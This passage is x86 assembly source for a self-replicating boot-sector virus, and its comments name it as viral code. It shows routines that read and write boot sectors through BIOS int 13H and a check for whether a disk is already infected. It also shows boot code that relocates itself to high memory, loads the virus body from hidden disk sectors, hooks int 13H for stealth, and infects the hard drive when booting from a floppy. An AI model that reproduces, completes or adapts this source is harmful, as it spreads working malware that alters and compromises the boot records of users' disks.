        mov     al,1                            ;read 1 sector
        mov     ah,2                            ;BIOS read function
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        ret


;*******************************************************************************
;This routine writes the data at es:bx to the drive in al at Track 0,
;Head 0, Sector 1 for 1 sector, making that data the new boot sector.

PUT_BOOT_SEC:
        mov     dl,al                           ;this is the drive to write to
        mov     dh,0                            ;head 0
        mov     ch,0                            ;track 0
        mov     cl,1                            ;sector 1
        mov     al,1                            ;read 1 sector
        mov     ah,3                            ;BIOS write function
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        ret


;*******************************************************************************
;Determine whether the boot sector in SCRATCHBUF is the viral boot sector.
;Returns Z if it is, NZ if not. The first 30 bytes of code, starting at BOOT,
;are checked to see if they are identical. If so, it must be the viral boot
;sector. It is assumed that es and ds are properly set to this segment when
;this is called.

IS_VBS:
        push    si                              ;save these
        push    di
        cld
        mov     di,OFFSET BOOT                  ;set up for a compare
;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT - OFFSET BOOT_START)
	mov	si,OFFSET SB_BOOT		;required instead of ^ for A86

        mov     cx,15
        repz    cmpsw                           ;compare 30 bytes
        pop     di                              ;restore these
        pop     si
        ret                                     ;and return with z properly set


;*******************************************************************************
;* A SCRATCH PAD BUFFER FOR DISK READS AND WRITES                              *
;*******************************************************************************

        ORG     7A00H

SCRATCHBUF:	   				;a total of 512 bytes
	DB	3 dup (0)
SB_BOOT_DATA:					;with references to correspond
	DB	32H dup (0)			;to various areas in the boot
SB_DR_FLAG:					;sector at 7C00
	DB	0				;these are only needed by A86
SB_BOOT:					;tasm and masm will let you
        DB      458 dup (0)			;just do "db 512 dup (0)"


;*******************************************************************************
;* THIS IS THE REPLACEMENT (VIRAL) BOOT SECTOR                                 *
;*******************************************************************************

        ORG     7C00H                           ;Starting location for boot sec


BOOT_START:
        jmp     SHORT BOOT                      ;jump over data area
        db      090H                            ;an extra byte for near jump


BOOT_DATA:
        db      32H dup (?)                     ;data area and default dbt
                                                ;(copied from orig boot sector)

DR_FLAG:DB      0                               ;Drive type flag, 0=360K Floppy
                                                ;                 1=1.2M Floppy
                                                ;                 2=720K Floppy
                                                ;                 3=1.4M Floppy
                                                ;                 80H=Hard Disk

;The boot sector code starts here
BOOT:
        cli                                     ;interrupts off
        xor     ax,ax
        mov     ss,ax
        mov     ds,ax
        mov     es,ax                           ;set up segment registers
        mov     sp,OFFSET BOOT_START            ;and stack pointer
        sti

        mov     ax,[MEMSIZE]                    ;get size of memory available
        mov     cl,6                            ;on this system, in Kilobytes
        shl     ax,cl                           ;convert KBytes into a segment
        sub     ax,7E0H                         ;subtract enough so this code
        mov     es,ax                           ;will have the right offset to
        sub     [MEMSIZE],4                     ;go memory resident in high ram

GO_RELOC:
        mov     si,OFFSET BOOT_START            ;set up ds:si and es:di in order
        mov     di,si                           ;to relocate this code
        mov     cx,256                          ;to high memory
        rep     movsw                           ;and go move this sector
        push    es
        mov     ax,OFFSET RELOC
        push    ax                              ;push new far @RELOC onto stack
        retf                                    ;and go there with retf

RELOC:                                          ;now we're in high memory
        push    es                              ;so let's install the virus
        pop     ds
        mov     bx,OFFSET STEALTH               ;set up buffer to read virus
        mov     al,BYTE PTR [DR_FLAG]           ;drive number
        cmp     al,0                            ;Load from proper drive type
        jz      LOAD_360
        cmp     al,1
        jz      LOAD_12M
        cmp     al,2
        jz      LOAD_720
        cmp     al,3
        jz      LOAD_14M                        ;if none of the above,
                                                ;then it's a hard disk

LOAD_HARD:                                      ;load virus from hard disk
        mov     dx,80H                          ;hard drive 80H, head 0,
        mov     ch,0                            ;track 0,
        mov     cl,2                            ;start at sector 2
        jmp     SHORT LOAD1

LOAD_360:                                       ;load virus from 360 K floppy
        mov     ch,40                           ;track 40
        mov     cl,1                            ;start at sector 1
        jmp     SHORT LOAD

LOAD_12M:                                       ;load virus from 1.2 Meg floppy
        mov     ch,80                           ;track 80
        mov     cl,1                            ;start at sector 1
        jmp     SHORT LOAD

LOAD_720:                                       ;load virus from 720K floppy
        mov     ch,79                           ;track 79
        mov     cl,4                            ;start at sector 4
        jmp     SHORT LOAD                      ;go do it

LOAD_14M:                                       ;load from 1.44 Meg floppy
        mov     ch,79                           ;track 79
        mov     cl,13                           ;start at sector 13
;       jmp     SHORT LOAD                      ;go do it

LOAD:   mov     dx,100H                         ;disk 0, head 1
LOAD1:  mov     ax,206H                         ;read 6 sectors
        int     13H                             ;call BIOS to read it

MOVE_OLD_BS:
        xor     ax,ax                           ;now move old boot sector into
        mov     es,ax                           ;low memory
        mov     si,OFFSET SCRATCHBUF            ;at 0000:7C00
        mov     di,OFFSET BOOT_START
        mov     cx,256
        rep     movsw

SET_SEGMENTS:                                   ;change segments around a bit
        cli
        mov     ax,cs
        mov     ss,ax
        mov     sp,OFFSET STEALTH               ;set up the stack for the virus
        push    cs                              ;and also the es register
        pop     es

INSTALL_INT13H:                                 ;now hook the Disk BIOS int
        xor     ax,ax
        mov     ds,ax
        mov     si,13H*4                        ;save the old int 13H vector
        mov     di,OFFSET OLD_13H
        movsw
        movsw
        mov     ax,OFFSET INT_13H               ;and set up new interrupt 13H
        mov     bx,13H*4                        ;which everybody will have to
        mov     ds:[bx],ax                      ;use from now on
        mov     ax,es
        mov     ds:[bx+2],ax
        sti

CHECK_DRIVE:
        push    cs                              ;set ds to point here now
        pop     ds
        cmp     BYTE PTR [DR_FLAG],80H          ;if booting from a hard drive,
        jz      DONE                            ;nothing else needed at boot

FLOPPY_DISK:                                    ;if loading from a floppy drive,
        call    IS_HARD_THERE                   ;see if a hard disk exists here
        jz      DONE                            ;no hard disk, all done booting
        mov     al,80H                          ;else load boot sector from C:
        call    GET_BOOT_SEC                    ;into SCRATCHBUF
        call    IS_VBS                          ;and see if C: is infected
        jz      DONE                            ;yes, all done booting
        call    INFECT_HARD                     ;else go infect hard drive C:

DONE:
        mov     si,OFFSET PART                  ;clean partition data out of
        mov     di,OFFSET PART+1                ;memory image of boot sector
        mov     cx,3FH                          ;so it doesn't get spread to
        mov     BYTE PTR [si],0                 ;floppies when we infect them
        rep     movsb

        xor     ax,ax                           ;now go execute old boot sector
        push    ax                              ;at 0000:7C00
        mov     ax,OFFSET BOOT_START
        push    ax
        retf


        ORG     7DBEH

PART:   DB      40H dup (?)                     ;partition table goes here

        ORG     7DFEH

        DB      55H,0AAH                        ;boot sector ID goes here

ENDCODE:                                        ;label for the end of boot sec

COMSEG  ENDS

        END     START

